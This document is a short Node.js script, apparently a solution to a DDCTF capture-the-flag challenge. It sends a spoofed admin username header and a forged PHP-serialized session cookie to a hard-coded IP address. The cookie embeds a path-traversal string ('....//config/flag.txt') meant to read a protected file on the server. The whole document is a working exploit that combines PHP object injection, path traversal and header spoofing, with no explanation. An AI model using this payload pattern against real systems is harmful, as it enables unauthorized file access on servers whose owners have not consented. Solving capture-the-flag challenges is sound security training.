const got = require('got')
const { CookieJar } = require('tough-cookie')

const createClient = () => {
  const jar = new CookieJar()
  return got.extend({
    headers: {
      didictf_username: 'admin',
    },
    cookieJar: jar,
  })
}

;(async () => {
  const SESSION = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
  const client = createClient()
  const response = await client.post('http://117.51.158.44/app/Session.php', {
    headers: {
      cookie: `ddctf_id=${encodeURIComponent(SESSION)};`,
    },
  })
  console.log(response.body)
})()
